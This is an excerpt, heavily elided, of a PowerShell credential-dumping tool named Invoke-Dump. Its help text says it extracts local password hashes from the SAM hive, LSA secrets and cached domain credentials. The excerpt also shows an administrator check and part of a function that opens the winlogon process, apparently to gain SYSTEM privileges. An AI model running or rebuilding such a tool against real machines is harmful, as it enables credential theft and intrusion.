...
.DESCRIPTION
    Invoke-Dump extracts password hashes of local accounts from SAM hive, LSA secrets and cached domain credentials from SECURITY hive.
...
.EXAMPLE
    PS C:\> Import-Module -Name .\Invoke-Dump.ps1 -Force
    PS C:\> Invoke-Dump
#>
...
Param ()
   ...
   {
        Write-host "This command must be launched as an Administrator" -ForegroundColor Red
        return
    }
...
Function Local:Invoke-AsSystem {
    ...
    If(($processHandle = [HiveDump.Native]::OpenProcess(0x400, $true, [Int32]$winlogonPid)) -eq [IntPtr]::Zero)
    {
        ...
        Write-host "$([ComponentModel.Win32Exception]$err)" -ForegroundColor Red
    }
